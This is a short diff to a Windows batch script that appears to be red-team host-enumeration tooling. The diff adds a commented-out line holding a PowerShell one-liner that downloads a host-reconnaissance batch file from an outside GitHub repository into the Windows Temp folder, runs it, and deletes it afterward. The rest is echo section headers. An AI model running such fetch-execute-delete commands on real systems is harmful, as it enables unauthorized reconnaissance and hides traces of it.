@@ -1,3 +1,4 @@
+rem powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_WMIC.bat -o C:\Windows\Temp\Host_Recon_WMIC.bat;C:\Windows\Temp\Host_Recon_WMIC.bat;del C:\Windows\Temp\Host_Recon_WMIC.bat"
 echo ::::HOST_Enumeration::::
 echo ::::OS_Specifics::::
 
